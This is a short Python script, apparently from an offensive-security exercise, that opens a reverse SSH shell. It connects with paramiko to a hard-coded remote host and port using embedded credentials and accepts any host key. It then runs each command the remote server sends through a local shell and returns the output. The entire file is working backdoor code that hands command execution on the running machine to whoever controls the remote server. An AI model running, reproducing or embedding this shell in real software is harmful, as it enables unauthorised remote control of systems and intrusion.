import subprocess
import paramiko


def ssh_command(ip, port, user, passwd, command):
    client = paramiko.SSHClient()
    # client can also support using key files
    # client.load_host_keys('/home/user/.ssh/known_hosts')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024))  # read banner

        while True:
            # get the command from the SSH server
            command = ssh_session.recv(1024)
            try:
                cmd_output = subprocess.check_output(command.decode(), shell=True)
                ssh_session.send(cmd_output)
            except Exception as e:
                ssh_session.send(str(e))
    client.close()
    return


ssh_command(ip='192.168.10.156', port=2345, user='user', passwd='pass', command='ClientConnected')